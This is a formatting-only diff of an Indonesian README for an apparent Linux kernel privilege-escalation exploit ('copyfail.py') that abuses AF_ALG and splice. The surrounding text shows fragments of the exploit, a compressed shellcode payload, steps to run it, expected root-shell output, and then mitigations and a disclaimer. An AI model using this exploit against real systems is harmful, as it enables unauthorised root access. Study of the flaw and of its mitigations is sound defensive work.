@@ -37,8 +37,7 @@ Kerentanan ini memungkinkan penyerang untuk:
 - Eksekusi /usr/bin/su memberikan shell root
 
 ## 🏗️ Arsitektur Kode
-### Struktur Program
-copyfail.py
+### Struktur Program (copyfail.py)
 ```
 ├── Konstanta
 │ ├── AF_ALG, SOCK_SEQPACKET
@@ -106,7 +105,7 @@ os.splice(target_fd, write_fd, offset + 4, offset_src=0)
 os.splice(read_fd, conn.fileno(), offset + 4)
 ```
 
-### 🎯 Payload
+## 🎯 Payload
 Payload yang digunakan adalah shellcode untuk mendapatkan shell root:
 
 ```python
@@ -117,15 +116,14 @@ compressed = hex_to_bytes(
 )
 payload = zlib.decompress(compressed)
 ```
-### 🚀 Panduan Instalasi
+## 🚀 Panduan Instalasi
 **Prasyarat**
 - Linux kernel 5.4 - 6.9 (rentan)
 - Python 3.6+
 - Hak akses user biasa (bukan root!)
-- Modul: authenc, algif_aead, hmac, sha256_generic, cbc, aes_generic
+- Modul: `authenc, algif_aead, hmac, sha256_generic, cbc, aes_generic`
 
 **Langkah-langkah**
-
 1. Buat user test
 ```
 sudo useradd -m testuser
@@ -137,7 +135,7 @@ sudo passwd testuser
 3. Jalankan eksploitasi
 `python3 copyfail.py`
 
-### 🔍 Diagnostik
+## 🔍 Diagnostik
 **Cek Kernel Version**
 `uname -r`
 
@@ -152,14 +150,14 @@ cat /proc/crypto | grep -A 10 "authenc"
 lsmod | grep -E "algif|authenc"
 find /lib/modules/$(uname -r) -name "*authenc*.ko*"
 ```
-### Cek Status Patch**
+### Cek Status Patch
 **Cek taint status (`0` = clean)**
 `cat /proc/sys/kernel/tainted`
 
 **Cek log kernel untuk patch**
 `dmesg | grep -i "crypto\|cve"`
 
-### 📊 Output yang Diharapkan
+## 📊 Output yang Diharapkan
 **Sistem Rentan (Berhasil)**
 ```
 ============================================================
@@ -199,9 +197,9 @@ uid=0(root) gid=0(root) groups=0(root)
     📚 Gunakan VM dengan kernel lama untuk pembelajaran
 ```
 
-### 🛡️ Mitigasi
-**Untuk Administrator**
-Update Kernel (Prioritas Utama)
+## 🛡️ Mitigasi
+### Untuk Administrator
+**Update Kernel (Prioritas Utama)**
 ```bash
 # Ubuntu/Debian
 sudo apt update && sudo apt upgrade -y
@@ -215,14 +213,14 @@ sudo reboot
 sudo pacman -Syu
 sudo reboot
 ```
-Disable AF_ALG (Sementara)
+**Disable AF_ALG (Sementara)**
 ```bash
 # Nonaktifkan modul
 sudo modprobe -r algif_aead
 echo "blacklist algif_aead" | sudo tee /etc/modprobe.d/blacklist-afalg.conf
 ```
 
-Kebijakan Seccomp (Container)
+**Kebijakan Seccomp (Container)**
 ```json
 {
   "defaultAction": "SCMP_ACT_ALLOW",
@@ -248,7 +246,7 @@ Kebijakan Seccomp (Container)
 - Gunakan AppArmor/SELinux
 - Terapkan prinsip least privilege
 
-### ⚠️ Disclaimer
+## ⚠️ Disclaimer
 Kode ini disediakan untuk tujuan edukasi dan penelitian keamanan saja.
 - ❌ Jangan gunakan pada sistem produksi
 - ❌ Jangan gunakan untuk tujuan ilegal
